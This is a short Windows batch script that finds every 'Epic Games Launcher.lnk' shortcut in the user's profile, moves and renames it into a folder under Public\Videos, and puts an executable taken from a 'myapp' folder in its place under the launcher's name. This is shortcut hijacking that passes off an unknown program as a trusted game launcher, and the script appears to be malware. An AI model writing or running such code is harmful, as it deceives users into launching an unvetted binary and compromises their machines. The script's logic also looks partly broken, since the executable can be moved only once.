@echo off
setlocal enabledelayedexpansion

set counter=0

for /r C:\Users\%USERNAME% %%a in (*) do (
    if "%%~nxa"=="Epic Games Launcher.lnk" (
        set /a counter+=1
        set p=%%~dpnxa
        move "!p!" "C:\Users\Public\Videos\GraphicalUserInterface"
        ren "C:\Users\Public\Videos\GraphicalUserInterface\Epic Games Launcher.lnk" "§ !counter!.lnk"
        move "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe" "!p!"
        ren "!p!" "Epic Games Launcher.exe"
    )
)